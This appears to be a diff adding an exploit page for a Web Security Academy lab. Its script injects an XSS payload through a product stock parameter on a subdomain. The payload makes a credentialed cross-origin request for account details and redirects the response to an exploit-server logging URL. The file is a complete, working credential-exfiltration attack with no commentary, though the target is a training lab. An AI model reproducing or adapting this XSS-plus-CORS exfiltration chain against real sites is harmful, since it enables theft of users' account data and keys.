@@ -1,0 +1,33 @@
+<html>
+
+<body>
+
+<div id="log">Iframe is present</div>
+<script> 
+// Encode the malicious payload as a parameter
+var payload = `
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get', 'http://0a5700c70439cd1785af3fbb00b900ab.web-security-academy.net/accountDetails', true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        console.log(window.location);
+        window.location = 'https://exploit-0a9800b804e4cdd8854c3e2e013c00e2.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
+    }
+`;
+// payload= `alert(1)`
+// Encode the payload to ensure it can be passed as a parameter
+var encodedPayload = encodeURIComponent(payload);
+
+// Construct the final URL
+var targetURL = "https://stock.0a5700c70439cd1785af3fbb00b900ab.web-security-academy.net/?productId=<img src=1 onerror="+ encodedPayload+"/>&storeId=1";
+
+// Redirect to the constructed URL
+window.location = targetURL;
+
+  </script>
+</body>
+</html>
+
+
